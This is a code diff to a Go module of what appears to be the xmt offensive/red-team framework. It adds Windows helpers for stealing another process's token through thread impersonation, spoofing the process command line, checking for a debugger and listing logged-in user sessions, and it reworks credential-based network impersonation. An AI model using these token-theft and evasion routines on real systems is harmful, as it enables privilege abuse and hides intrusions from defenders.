@@ -24,6 +24,8 @@ import (
 	"runtime"
 	"runtime/debug"
 	"strings"
+	"time"
+	"unsafe"
 
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/device/winapi"
@@ -33,7 +35,7 @@ import (
 
 // ErrNoNix is an error that is returned when a Windows device attempts a *nix
 // specific function.
-var ErrNoNix = xerr.Sub("only supported on *nix devices", 0x21)
+// var ErrNoNix = xerr.Sub("only supported on *nix devices", 0x21)
 
 type file interface {
 	File() (*os.File, error)
@@ -83,18 +85,7 @@ func IsDebugged() bool {
 			}
 		}
 	}
-	if winapi.IsDebuggerPresent() {
-		return true
-	}
-	// 0x400 - PROCESS_QUERY_INFORMATION
-	h, err := winapi.OpenProcess(0x400, false, winapi.GetCurrentProcessID())
-	if err != nil {
-		return false
-	}
-	var d bool
-	err = winapi.CheckRemoteDebuggerPresent(h, &d)
-	winapi.CloseHandle(h)
-	return err == nil && d
+	return winapi.IsDebugged()
 }
 func proxyInit() *config {
 	var (
@@ -208,6 +199,44 @@ func split(s string) []string {
 	return r
 }
 
+// Logins returns an array that contains information about current logged
+// in users.
+//
+// This call is OS-independent but many contain invalid session types.
+//
+// Always returns an empty array on WSAM/JS.
+func Logins() ([]Login, error) {
+	s, err := winapi.WTSGetSessions(0)
+	if err != nil {
+		return nil, err
+	}
+	if len(s) == 0 {
+		return nil, nil
+	}
+	o := make([]Login, 0, len(s))
+	for i := range s {
+		if s[i].Status >= 6 && s[i].Status <= 9 {
+			continue
+		}
+		// NOTE(dij): Should we hide the "Services" session (ID:0, Status:4)
+		//            from this list?
+		v := Login{
+			ID:        s[i].ID,
+			Host:      s[i].Host,
+			Status:    s[i].Status,
+			Login:     time.Unix(s[i].Login, 0),
+			LastInput: time.Unix(s[i].LastInput, 0),
+		}
+		if v.From.SetBytes(s[i].From); len(s[i].Domain) > 0 {
+			v.User = s[i].Domain + "\\" + s[i].User
+		} else {
+			v.User = s[i].User
+		}
+		o = append(o, v)
+	}
+	return o, nil
+}
+
 // Mounts attempts to get the mount points on the local device.
 //
 // On Windows devices, this is the drive letters available, otherwise on nix*
@@ -231,13 +260,15 @@ func Mounts() ([]string, error) {
 }
 
 // SetProcessName will attempt to override the process name on *nix systems
-// by overwriting the argv block.
+// by overwriting the argv block. On Windows, this just overrides the command
+// line arguments.
 //
-// Returns 'ErrNoNix' on Windows devices.
+// Linux support only allows for suppling a command line shorter the current
+// command line.
 //
-// Found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
-func SetProcessName(_ string) error {
-	return ErrNoNix
+// Linux found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
+func SetProcessName(s string) error {
+	return winapi.SetCommandLine(s)
 }
 
 // SetCritical will set the critical flag on the current process. This function
@@ -273,6 +304,10 @@ func SetCritical(c bool) (bool, error) {
 //
 // Always returns 'ErrNoWindows' on non-Windows devices.
 func Impersonate(f *filter.Filter) error {
+	// Try this as it's faster first.
+	if ImpersonateThread(f) == nil {
+		return nil
+	}
 	if f.Empty() {
 		return filter.ErrNoProcessFound
 	}
@@ -298,46 +333,36 @@ func Impersonate(f *filter.Filter) error {
 	if winapi.CloseHandle(x); err != nil {
 		return err
 	}
+	runtime.LockOSThread()
 	err = winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
+	runtime.UnlockOSThread()
 	winapi.CloseHandle(y)
 	return err
 }
 
-// ImpersonateUser attempts to log in with the supplied credentials and impersonate
-// the logged in account.
+// ImpersonateThread attempts to steal the Token in use by the target process of
+// the supplied filter using Threads and 'NtImpersonateThread'.
 //
 // This will set the permissions of all threads in use by the runtime. Once work
 // has completed, it is recommended to call the 'RevertToSelf' function to
 // revert the token changes.
 //
-// This impersonation is network based, unlike impersonating a Process token.
-// (Windows-only, would be cool to do a *nix one).
-func ImpersonateUser(user, domain, pass string) error {
-	// NOTE(dij): Do we need to do this?
-	//  AdjustPrivileges("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege")
-	// 0x9 - LOGON32_LOGON_NEW_CREDENTIALS
-	x, err := winapi.LoginUser(user, domain, pass, 0x9, 0)
+// Always returns 'ErrNoWindows' on non-Windows devices.
+func ImpersonateThread(f *filter.Filter) error {
+	if f.Empty() {
+		return filter.ErrNoProcessFound
+	}
+	// 0x0200 - THREAD_DIRECT_IMPERSONATION
+	h, err := f.ThreadFunc(0x200, nil)
 	if err != nil {
 		return err
 	}
+	s := winapi.SecurityQualityOfService{ImpersonationLevel: 2}
+	s.Length = uint32(unsafe.Sizeof(s))
 	runtime.LockOSThread()
-	// NOTE(dij): For best results, we FIRST impersonate the token, THEN
-	//            we try to set the token to each user thread with a duplicated
-	//            token set to impersonate. (Similar to an Impersonate call).
-	err = winapi.ImpersonateLoggedOnUser(x)
-	if winapi.CloseHandle(x); err != nil {
-		runtime.UnlockOSThread()
-		return err
-	}
-	var y uintptr
-	// 0xF01FF - TOKEN_ALL_ACCESS
-	if err = winapi.OpenThreadToken(winapi.CurrentThread, 0xF01FF, false, &y); err != nil {
-		runtime.UnlockOSThread()
-		return err
-	}
-	err = winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
-	winapi.CloseHandle(y)
+	err = winapi.ForEachThread(func(x uintptr) error { return winapi.NtImpersonateThread(x, h, &s) })
 	runtime.UnlockOSThread()
+	winapi.CloseHandle(h)
 	return err
 }
 
@@ -391,5 +416,45 @@ func DumpProcess(f *filter.Filter, w io.Writer) error {
 	winapi.CloseHandle(h)
 	runtime.GC()
 	FreeOSMemory()
+	return err
+}
+
+// ImpersonateUserNetwork attempts to log in with the supplied credentials and impersonate
+// the logged in account.
+//
+// This will set the permissions of all threads in use by the runtime. Once work
+// has completed, it is recommended to call the 'RevertToSelf' function to
+// revert the token changes.
+//
+// This impersonation is network based, unlike impersonating a Process token.
+// (Windows-only, would be cool to do a *nix one).
+func ImpersonateUserNetwork(user, domain, pass string) error {
+	// NOTE(dij): Do we need to do this?
+	//  AdjustPrivileges("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege")
+	// TODO(dij): Maybe revisit this? I need a good way to test the validity of
+	//            this function.
+	// 0x9 - LOGON32_LOGON_NEW_CREDENTIALS
+	x, err := winapi.LoginUser(user, domain, pass, 0x9, 0)
+	if err != nil {
+		return err
+	}
+	runtime.LockOSThread()
+	// NOTE(dij): For best results, we FIRST impersonate the token, THEN
+	//            we try to set the token to each user thread with a duplicated
+	//            token set to impersonate. (Similar to an Impersonate call).
+	err = winapi.ImpersonateLoggedOnUser(x)
+	if winapi.CloseHandle(x); err != nil {
+		runtime.UnlockOSThread()
+		return err
+	}
+	var y uintptr
+	// 0xF01FF - TOKEN_ALL_ACCESS
+	if err = winapi.OpenThreadToken(winapi.CurrentThread, 0xF01FF, false, &y); err != nil {
+		runtime.UnlockOSThread()
+		return err
+	}
+	err = winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
+	runtime.UnlockOSThread()
+	winapi.CloseHandle(y)
 	return err
 }
